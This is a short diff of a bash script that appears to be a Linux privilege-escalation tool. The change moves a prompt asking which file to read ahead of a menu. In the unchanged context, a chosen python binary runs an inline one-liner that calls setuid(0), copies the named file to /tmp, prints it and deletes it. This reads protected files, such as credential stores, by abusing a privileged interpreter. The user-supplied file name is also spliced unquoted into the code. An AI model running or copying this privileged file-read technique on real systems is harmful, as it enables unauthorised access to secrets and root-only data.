@@ -255,6 +255,14 @@ while true; do
             fi
 
             while true; do
+
+              read -p "What file do you want to read ? : " FILE
+                  
+              if [[ ! -f "$FILE" ]]; then
+                  echo "Error: file '$FILE' does not exist."
+                  break
+               fi
+            
                 echo "Choose from the following : "
                 echo " "
             
@@ -262,13 +270,6 @@ while true; do
                     case "$choice" in
                         *python*)
                         
-                            read -p "What file do you want to read ? : " FILE
-
-                            if [[ ! -f "$FILE" ]]; then
-                                echo "Error: file '$FILE' does not exist."
-                                break
-                            fi
-                            
                             echo "Trying with $choice"
                             
                             "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
